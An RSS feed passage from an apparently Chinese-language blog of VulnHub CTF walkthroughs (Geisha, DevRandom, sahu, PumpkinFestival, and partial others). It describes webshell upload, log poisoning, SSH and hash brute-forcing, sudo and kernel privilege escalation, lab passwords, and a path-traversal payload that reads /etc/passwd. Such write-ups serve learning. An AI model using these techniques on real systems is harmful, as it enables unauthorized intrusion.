&lt;p&gt;后台上传webshell，找了老半天了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE865fd551d6713d868094379641d808b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2fc2369393c45aad527cabafcf38d948image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9b6a05899fa1153cf3f5a4ec96673bc2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;提权到loly失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9f02128b5d446631dcb1e826333b02b0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过查找网站的数据库密码，切换成功：&lt;/p&gt;
&lt;p&gt;lolyisabeautifulgirl&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3c52bc16c4a066df46d18c84d41cc3c7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;本来是不想用内核提权的，找了半天好像没其他方式了：&lt;/p&gt;
&lt;p&gt;CVE-2017-16995&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed0a4d73351cb75a592ac4e1e4cf0f5dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x049 Geisha</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x049-geisha/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x049-geisha/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5860bad91663e99cb75a73250cbd9ddeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEca0ecaa1b593036f264e606d18221da2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;所有端口都看了一下，几乎都是这个样子，还怪好看的嘞，但是下下来看了一下，没有发现什么隐藏信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf8e03c3798527180fff0c8870acc214image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;21端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE487a3c6dc3e1865339a426200dc02287image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这样的话，就只剩一个22端口了，尝试爆破，由于啥信息都没有，就只能试试geisha了：&lt;/p&gt;
&lt;p&gt;大概跑了10多分钟，爆破出了密码为letmein&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45b536b1f16ee673da74c6911c8a31e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE10b59b205779b708a9081d153a3bec3bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看root密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE71a02329d5b92176037fa5f55dee1944image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破hash:&lt;/p&gt;
&lt;p&gt;跑了20分钟了，都没跑成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE531f8eb5ea361cad7b07d629643e2ee2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;忘了能读密钥啊：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdce7b64c708086c6cb8be8ad654659b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2d19f2a8cb2e5cb094cc083d56f8988cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x050 DevRandom CTF 1.1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x050-devrandom-ctf-1.1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x050-devrandom-ctf-1.1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2ac6cee533010f128468f11e3f047d60image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEee81955c2be115c056ffb645efbaa2f7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa6f9ba35d3d592fb76e7d213ad6dfc11image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;80端口看看吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0accb3df785170efd2f1361544b6ce22image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE64fb3a61efdadf803006f933c9a107f5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;对发现的目录挨个访问，发现可能利用的目标：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE32b097cc210fb1209978ee56e2d0d666image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过日志写进去后，读取出现了错误：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE81592191b1ef6f48cf356dd87a243695%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现一个API，试了路径，暂时不知道什么意思：&lt;/p&gt;
&lt;p&gt;4395874598yt3r9iy98r7r90t87treterrrrr&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc21072bdcee72d3f094679eb5c5faadf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有一个：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcaef03ec16a22d30f5ffb75729f45ea6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现了文件包含：&lt;/p&gt;
&lt;p&gt;../../../../../../../etc/passwd&lt;/p&gt;
&lt;p&gt;/var/www/html/&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb8fe1a6296bc4e6f0c458dc5038426f4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;呐其实我就开始琢磨包含刚刚写的webshell了：&lt;/p&gt;
&lt;p&gt;试了半天，包含不上去，暂时不清楚是什么原因，待会儿看看代码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa41c10150b2d4011fe0f478f00990458%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;下策，ssh 爆破:&lt;/p&gt;
&lt;p&gt;得到账号密码，时间巨长，建议挂着&lt;/p&gt;
&lt;p&gt;trevor：qwertyuiop[]&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd8a43cc8fe3cad9c156dba9744ddfb7b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;sudo 提权&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc4b3afe566408dcb9b2445f33c9cd84d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7d63f8f9599b785e86fc65c203bd5c1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个日志确实是可以getshell的，但是日志数量多了后面可能就会出现问题，可能是闭合的问题&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEea81bbe41588835b92673a1b1aa822f7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x051 sahu 1.1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x051-sahu-1.1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x051-sahu-1.1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf94a020f66ecab1a811342b6fffc24df%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7e14a01b52fb8b9e14f8d0131b978621%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda50d08dca22bbfa04f8f85d9a4d790e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;有匿名登录&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEef35079603452e67f51ebacfd197e309%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有加密：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9bd88e70889c729cc3ab307fa1304ae%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不知道为啥不让破解：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5ae1b04367cba1de2add1854ac945d15%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;尝试使用hashcat:&lt;/p&gt;
&lt;p&gt;处理一下hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1540de3bfdbef036e7801c04a531b5e9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查询hash编号：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc545993ea74c81eac785f719b1917f8b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破，还是失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2c5b0a347f670702f1f76520fa3bdc93%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb，无果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc200a606b302f09adcc0018163f665cb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只剩下80了：&lt;/p&gt;
&lt;p&gt;开局只有一个目录，经过一堆扫描：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE33e0536f3537544a9349dbe13dff2e51%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看到了这样一个页面：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://192.168.5.104/H/A/R/Y/A/N/A/&#34;&gt;http://192.168.5.104/H/A/R/Y/A/N/A/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcbed0c2b036ff37ceaa0bf21e783f6d6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;收集密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE13ce0262964ef3185e4f3ae0dceaba37%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4d5ce408b46dce1fb67fe145243946a1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是爆破了半天没有结果，再看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5eeb223f6f3ba2709a8a21c2fc9bc45c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试过了，这不是zip的密码，又几经波折，找到了首页的图片，这个图片有没有可能隐藏信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcc5fc75b74982bb66e31999358814f44%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到信息，提示让我们补全后两位：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec0702de1129a7a2bfe2360c81284151%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能生成字典了，这里需要学习Crunch工具的使用方法：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_63844103/article/details/127979575&#34;&gt;https://blog.csdn.net/qq_63844103/article/details/127979575&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大概就是，数字，字符，大小写字母的组合&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf1eec2feebaa35cdf0596d7462d0f91%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2037fe5676ff869725ca6d97c3351290%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这次就爆破成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6f1a3287e8af42d994923dfdbfb27687%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf8b1ecdeb729272edada5550c6d17fb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE22cfcc8cfecaf154fc5231bb174622fa%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x052 PumpkinFestival</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x052-pumpkinfestival/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x052-pumpkinfestival/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2a2160290ff84d0bac25efc53f27e018image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb2c2736f59113e1cb2ad1b45d9ca98deimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE752c4087bfb18918c0e91024f81b73c9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口，可以匿名登录，发现一个可疑线索：&lt;/p&gt;
&lt;p&gt;PumpkinToken : 2d6dbbae84d724409606eddd9dd71265&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEde054088f8daddc2450d85e1e216b4c8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc80fe9bbb367538c48dd50d69f4075ddimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdae99a97e1b4903b9f5f0049d1766561image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现可疑线索：&lt;/p&gt;
&lt;p&gt;Hey Jack!&lt;/p&gt;
&lt;p&gt;Thanks for choosing our local store. Hope you like the services.&lt;/p&gt;
&lt;p&gt;Tracking code : 2542 8231 6783 486&lt;/p&gt;
&lt;p&gt;-Regards&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;mailto:admin@pumpkins.local&#34;&gt;admin@pumpkins.local&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE24433be8e1bf21e56e0842ef74eebbdaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;token?:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE48e54729ac264037152ab08e189b97feimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;浏览器携带看看，可能是用来访问其他几个页面的：&lt;/p&gt;
&lt;p&gt;多次组合都发现失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9fac0fa1d058fd739eee174ff04bf584image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后修改了hosts文件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE644d1159228a8e884adf35a89c828261image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次访问：&lt;/p&gt;
&lt;p&gt;又发现一个token:&lt;/p&gt;
&lt;p&gt;PumpkinToken : 06c3eb12ef2389e2752335beccfb2080&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfa02f6e2dd77b2b7f7bbd9110f3da885image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE42d2b86845076acf037181b53653b3b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;cewl收集的字典爆破失败了，用rockyou挂着爆破吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE341fd3ab0828cbf75a3e9aa4c91d0500image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3075c9bcfaaf3e7bad5ebc32f6d6164fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后再对&lt;a href=&#34;http://pumpkins.local&#34;&gt;http://pumpkins.local&lt;/a&gt;进行一次扫描：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x053 PumpkinGarden </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x053-pumpkingarden-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x053-pumpkingarden-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8f48023944d46d52b206328bd86b2806image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2af349a70c97663909a94dfad0a654a5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc04468d25bf498f4746b82fc374ec41bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口&lt;/p&gt;
&lt;p&gt;可能存在jack用户，以及提到了PumpkinGarden&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE394da7310347d4efc508845a87ac3861image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;1515端口&lt;/p&gt;
&lt;p&gt;提示说，南瓜图片可能能帮助我，以及在under the hood？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE31af89c66e13be78e1dc4cbf70ceafc5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;尝试查看了一下首页的图片，没有发现东西&lt;/p&gt;
&lt;p&gt;遂端口扫描，发现img&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1e0557e1b2eb79716a48a6595499f8fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看里面有什么好东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbec7482571ab3c2ee2891c8e0233313aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;c2NhcmVjcm93IDogNVFuQCR5&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1c20635d4ab26d58da5d912765175a85image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这些图片又看了一下，没有隐藏信息，那么这个字符串是用来干嘛的？&lt;/p&gt;
&lt;p&gt;scarecrow : 5Qn@$y&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE364aaf5263d963514551a40263b72b54image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;居然登录成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE87d8fe7ee6dc93ebe5898828550c0089image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa727f8fca930152128d6142faa9de61dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2b0855dd7a86366034cec844c4bd9e22image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现是goblin用户的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE34bdc0351488c9c1fbd50601e0b3caefimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有提示：&lt;/p&gt;
